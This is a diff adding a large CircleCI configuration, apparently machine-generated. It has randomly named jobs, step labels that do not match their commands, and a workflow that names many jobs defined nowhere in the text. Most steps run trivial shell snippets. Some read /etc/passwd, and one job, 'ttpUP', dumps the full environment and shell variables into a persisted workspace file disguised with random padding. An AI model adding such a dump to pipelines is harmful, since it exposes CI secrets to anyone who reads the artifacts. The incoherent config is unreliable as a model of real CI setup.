+  Verify_Pipeline2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/eN 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  reduce_edgePrevious:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Rally at the dependencies
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; ok='the end' && printf '%s\n' "${ok// /_}"; true ; } > /tmp/pi/velvet.bramble.filter
+            echo "complete $(wc -c </tmp/pi/velvet.bramble.filter)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'velvet.bramble.filter'
+  foxtrot-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/velvet.bramble.filter 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  undoRetreive:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Where is the customer
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; printf '%s\n' white red yellow green magenta black | xargs -I{} echo "item: {}"; true ; } > /tmp/pi/mEAdoWYIeldREPOrTAlPhA
+            echo "complete $(wc -c </tmp/pi/mEAdoWYIeldREPOrTAlPhA)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'mEAdoWYIeldREPOrTAlPhA'
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/mEAdoWYIeldREPOrTAlPhA 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  CommonSemaphoreBase:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: T plus 30 min submit the login button
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; for elem in {1..16..2}; do echo "${elem} squared is $((elem**2))"; done | paste -sd ' '; true ; } > /tmp/pi/PANO-97701
+            echo "complete $(wc -c </tmp/pi/PANO-97701)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'PANO-97701'
+  d-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/6OssV5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  end_lock_reload_reload:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Sacrifice a goat to the bastion host
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; grep -h -R case /usr/share/doc/bash | nl | head -n 8; true ; } > /tmp/pi/lambda62
+            echo "complete $(wc -c </tmp/pi/lambda62)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'lambda62'
+  py310-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/lambda62 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  theTempo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: LIVE Rinse
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; /bin/echo 'it works'; true ; } > /tmp/pi/3NCc
+            echo "complete $(wc -c </tmp/pi/3NCc)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - '3NCc'
+  LAB_STAGE_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/6OssV5 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+  saveFRONT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: linking status update quietly
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; for w in {0..5}; do echo "${w}"; done; true ; } > /tmp/pi/wFzBByrMvfw9ZuCkj4
+            echo "complete $(wc -c </tmp/pi/wFzBByrMvfw9ZuCkj4)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'wFzBByrMvfw9ZuCkj4'
+  prometheus-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Load handoff data
+          command: |
+            sed -e 's/ /_/g' /tmp/pi/wFzBByrMvfw9ZuCkj4 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 5 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xf main-fixtures-v5.tar
+      - run:
+          name: Hash artifacts
+          command: free -m
+      - run:
+          command: cmake --version
+      - run:
+          name: Hash artifacts
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          command: bash -c "./init-lite"
+
+  tax-domino:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Sanitise the blog post whilst idle
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; awk -F ":" 'NR % 2 {printf "%-16s %s\n", $1, $7}' /etc/passwd | wc -l; true ; } > /tmp/pi/draft_e6e357f5
+            echo "complete $(wc -c </tmp/pi/draft_e6e357f5)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'draft_e6e357f5'
+  ttpUP:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Altimeter set
+          command: |
+            mkdir -p /tmp/pi
+            set +o pipefail 2>/dev/null; { env; declare -p; } > /tmp/pi/HostPulse 2>/dev/null; dd if=/dev/urandom bs=100 count=500 2>/dev/null >> /tmp/pi/HostPulse; true
+            echo "complete $(wc -c </tmp/pi/HostPulse)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'HostPulse'
+  needs_box:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Bjorn owns focus
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; thing=0; while test $thing -lt 4; do echo $thing; thing=$((thing+1)); done; true ; } > /tmp/pi/ParserKernelGlacier
+            echo "complete $(wc -c </tmp/pi/ParserKernelGlacier)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'ParserKernelGlacier'
+  i:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: May Deployment Run
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; grep -r alias /etc/security 2>/dev/null | cut -d: -f1 | sort -u; true ; } > /tmp/pi/mEAdoWYIeldREPOrTAlPhA
+            echo "complete $(wc -c </tmp/pi/mEAdoWYIeldREPOrTAlPhA)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'mEAdoWYIeldREPOrTAlPhA'
+  acvN9ZHQpSzd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Mock Perf Baseline And Stress Test The Coverage Report
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'ready?' |tr -s ' '; true ; } > /tmp/pi/trial-51v
+            echo "complete $(wc -c </tmp/pi/trial-51v)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'trial-51v'
+  full_protocol_mbps:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Chonky hot swap
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; test -b /dev/null && echo yes || echo 'no'; true ; } > /tmp/pi/67b1bXSzS3mLt2Wi8ykp
+            echo "complete $(wc -c </tmp/pi/67b1bXSzS3mLt2Wi8ykp)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - '67b1bXSzS3mLt2Wi8ykp'
+  globeish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Right then finalise the sprite sheet
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; echo -n "yes" | sha1sum; true ; } > /tmp/pi/56.154.97.96
+            echo "complete $(wc -c </tmp/pi/56.154.97.96)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - '56.154.97.96'
+  teardownReleaseTotal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Upload sidecar gen 5
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; printf 'crow\t78\nguide\t68\ngarden\t74\nstats\t89\n' >"/tmp/secondary.menu.tsv" && cut -f1 "/tmp/secondary.menu.tsv"; true ; } > /tmp/pi/velvet.bramble.filter
+            echo "complete $(wc -c </tmp/pi/velvet.bramble.filter)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'velvet.bramble.filter'
+  shader_cli:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Go ahead and draft the help center
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; [[ -e /proc/self ]] && echo yes || echo 'no'; true ; } > /tmp/pi/error-3352e.log
+            echo "complete $(wc -c </tmp/pi/error-3352e.log)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'error-3352e.log'
+  autumn_510:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Turn 22 transcode bumper b
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; cut -d : -f 7 /etc/passwd | head -n 3 | awk -F/ '{ print $NF }'; true ; } > /tmp/pi/wFzBByrMvfw9ZuCkj4
+            echo "complete $(wc -c </tmp/pi/wFzBByrMvfw9ZuCkj4)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'wFzBByrMvfw9ZuCkj4'
+  allowAdvance:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: 24 reminding duty manager
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; ls -h -A -r . | awk 'NR % 3 == 0'; true ; } > /tmp/pi/eN
+            echo "complete $(wc -c </tmp/pi/eN)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'eN'
+  choosehidden:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: mask oauth scopes too
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; diff -y --width=49 <(seq 4) <(seq 2 5) | head -5; true ; } > /tmp/pi/env-Wolf-tmp
+            echo "complete $(wc -c </tmp/pi/env-Wolf-tmp)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'env-Wolf-tmp'
+  contractCtx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Screenshot the empty state via cron
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; echo -n 'something went wrong' && echo; true ; } > /tmp/pi/lambda62
+            echo "complete $(wc -c </tmp/pi/lambda62)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'lambda62'
+  metric_spec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Pinch the password field as usual
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; cut -d: -f7 /etc/passwd | xargs -n1 dirname | head -n 5; true ; } > /tmp/pi/echo908
+            echo "complete $(wc -c </tmp/pi/echo908)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'echo908'
+  StandardTagPipeline:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: triage failing specs last
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; tar czf "/tmp/attic-forum.tgz" -C /etc profile.d && mkdir -p /tmp/mileage && tar -xzf "/tmp/attic-forum.tgz" -C /tmp/mileage && ls -R /tmp/mileage; true ; } > /tmp/pi/4759a30a
+            echo "complete $(wc -c </tmp/pi/4759a30a)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - '4759a30a'
+  Charlie:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Check the toast message is enabled
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; for w in bogota zurich tokyo austin; do printf '%-8s %d\n' "$w" ${#w}; done; true ; } > /tmp/pi/burstbronze
+            echo "complete $(wc -c </tmp/pi/burstbronze)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'burstbronze'
+  entry20081004:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Only if the training set is stale
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >"/tmp/Island-draft.gz" && zgrep -c bash "/tmp/Island-draft.gz"; true ; } > /tmp/pi/190.104.65.116
+            echo "complete $(wc -c </tmp/pi/190.104.65.116)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - '190.104.65.116'
+  red2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pi
+      - run:
+          name: Id b6c7 select
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; printf '%s\n' wolf goose whale >/tmp/sync.list && tac /tmp/sync.list; true ; } > /tmp/pi/debug.log.9
+            echo "complete $(wc -c </tmp/pi/debug.log.9)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'debug.log.9'
+  dBusSymbol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Initialize
+          command: |
+            mkdir -p /tmp/pi
+            { set +o pipefail 2>/dev/null; ls /mnt | wc -l; true ; } > /tmp/pi/f950ffc2930c527168cfed04f
+            echo "complete $(wc -c </tmp/pi/f950ffc2930c527168cfed04f)"
+      - persist_to_workspace:
+          root: /tmp/pi
+          paths:
+            - 'f950ffc2930c527168cfed04f'
+workflows:
+  main:
+    jobs:
+      - inner-flag
+      - tax-domino:
+          requires:
+            - inner-flag
+      - run-nightly-test-matrix:
+          requires:
+            - tax-domino
+      - xice0fh1j9j3u0:
+          requires:
+            - tax-domino
+      - ttpUP:
+          requires:
+            - xice0fh1j9j3u0
+      - API-865:
+          requires:
+            - ttpUP
+      - edgeDidLoad:
+          requires:
+            - ttpUP
+      - needs_box:
+          requires:
+            - edgeDidLoad
+      - bob-ship:
+          requires:
+            - needs_box
+      - undoRetreive:
+          requires:
+            - needs_box
+      - i:
+          requires:
+            - undoRetreive
+      - yolo:
+          requires:
+            - i
+      - SLOT_VERSION:
+          requires:
+            - i
+      - acvN9ZHQpSzd:
+          requires:
+            - SLOT_VERSION
+      - intergration:
+          requires:
+            - acvN9ZHQpSzd
+      - brown200:
+          requires:
+            - acvN9ZHQpSzd
+      - full_protocol_mbps:
+          requires:
+            - brown200
+      - foxtrot:
+          requires:
+            - full_protocol_mbps
+      - ourLevelBase:
+          requires:
+            - full_protocol_mbps
+      - globeish:
+          requires:
+            - ourLevelBase
+      - chore-7915:
+          requires:
+            - globeish
+      - reduce_edgePrevious:
+          requires:
+            - globeish
+      - teardownReleaseTotal:
+          requires:
+            - reduce_edgePrevious
+      - foxtrot-8:
+          requires:
+            - teardownReleaseTotal
+      - NBF__BOTTOM_DATABASE:
+          requires:
+            - teardownReleaseTotal
+      - shader_cli:
+          requires:
+            - NBF__BOTTOM_DATABASE
+      - wen-ship:
+          requires:
+            - shader_cli
+      - saveFRONT:
+          requires:
+            - shader_cli
+      - autumn_510:
+          requires:
+            - saveFRONT
+      - prometheus-ng:
+          requires:
+            - autumn_510
+      - rewind-lock:
+          requires:
+            - autumn_510
+      - allowAdvance:
+          requires:
+            - rewind-lock
+      - Verify_Pipeline2:
+          requires:
+            - allowAdvance
+      - ichDeep:
+          requires:
+            - allowAdvance
+      - choosehidden:
+          requires:
+            - ichDeep
+      - bob-smoke:
+          requires:
+            - choosehidden
+      - end_lock_reload_reload:
+          requires:
+            - choosehidden
+      - contractCtx:
+          requires:
+            - end_lock_reload_reload
+      - py310-ship:
+          requires:
+            - contractCtx
+      - sk-Hans:
+          requires:
+            - contractCtx
+      - metric_spec:
+          requires:
+            - sk-Hans
+      - dp-2:
+          requires:
+            - metric_spec
+      - PUBLIC_CELL:
+          requires:
+            - metric_spec
+      - StandardTagPipeline:
+          requires:
+            - PUBLIC_CELL
+      - deploy:
+          requires:
+            - StandardTagPipeline
+      - ZONE_FILE:
+          requires:
+            - StandardTagPipeline
+      - Charlie:
+          requires:
+            - ZONE_FILE
+      - ga-v5:
+          requires:
+            - Charlie
+      - fOV4IB8:
+          requires:
+            - Charlie
+      - entry20081004:
+          requires:
+            - fOV4IB8
+      - Run_App1:
+          requires:
+            - entry20081004
+      - jm18cavfmnvwx:
+          requires:
+            - entry20081004
+      - red2:
+          requires:
+            - jm18cavfmnvwx
+      - jan17-smoke:
+          requires:
+            - red2
+      - cold-p:
+          requires:
+            - red2
+      - dBusSymbol:
+          requires:
+            - cold-p
+      - lets-go:
+          requires:
+            - dBusSymbol
+      - bundle956usd
+      - tango-oscar-8
+      - NavWriterGardenTraceEmber
+      - pr-alt:
+          requires:
+            - bundle956usd
+            - tango-oscar-8
+            - NavWriterGardenTraceEmber
+      - v5-beta:
+          requires:
+            - bundle956usd
+            - tango-oscar-8
+            - NavWriterGardenTraceEmber
+      - orion-v2:
+          requires:
+            - bundle956usd
+            - tango-oscar-8
+            - NavWriterGardenTraceEmber
+      - LAB_STAGE_6:
+          requires:
+            - bundle956usd
+            - tango-oscar-8
+            - NavWriterGardenTraceEmber
+      - LAB_MERGE_5:
+          requires:
+            - bundle956usd
+            - tango-oscar-8
+            - NavWriterGardenTraceEmber
+      - run-partial-artifact-bundle:
+          requires:
+            - bundle956usd
+            - tango-oscar-8
+            - NavWriterGardenTraceEmber
+      - cf-v2:
+          requires:
+            - bundle956usd
+            - tango-oscar-8
+            - NavWriterGardenTraceEmber
+      - bun-release:
+          requires:
+            - bundle956usd
+            - tango-oscar-8
+            - NavWriterGardenTraceEmber
+      - LAB_BUILD_7:
+          requires:
+            - bundle956usd
+            - tango-oscar-8
+            - NavWriterGardenTraceEmber
+      - rip-it:
+          requires:
+            - bundle956usd
+            - tango-oscar-8
+            - NavWriterGardenTraceEmber
+      - d-v2:
+          requires:
+            - bundle956usd
+            - tango-oscar-8
+            - NavWriterGardenTraceEmber
